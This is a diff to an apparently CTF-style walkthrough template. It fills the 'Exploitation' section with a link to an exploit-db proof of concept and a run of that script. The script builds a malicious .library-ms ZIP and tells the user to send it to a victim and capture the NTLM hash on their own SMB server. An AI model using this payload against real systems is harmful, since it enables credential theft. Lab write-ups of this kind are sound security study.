@@ -224,11 +224,16 @@ Description of the vulnerability exploited.
 
 ### Exploitation
 
-Step-by-step exploitation with commands.
+poc: https://www.exploit-db.com/exploits/52310
 
 ```shell
-# Commands used
+python3 52310.py -i 10.10.15.80 -n payload1 -o ./output_folder --keep
+[*] Generating malicious .library-ms file...
+[+] Created ZIP: output_folder/payload1.zip
+[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.                                                                            
 ```
+
+
 
 ---
 ## User Flag
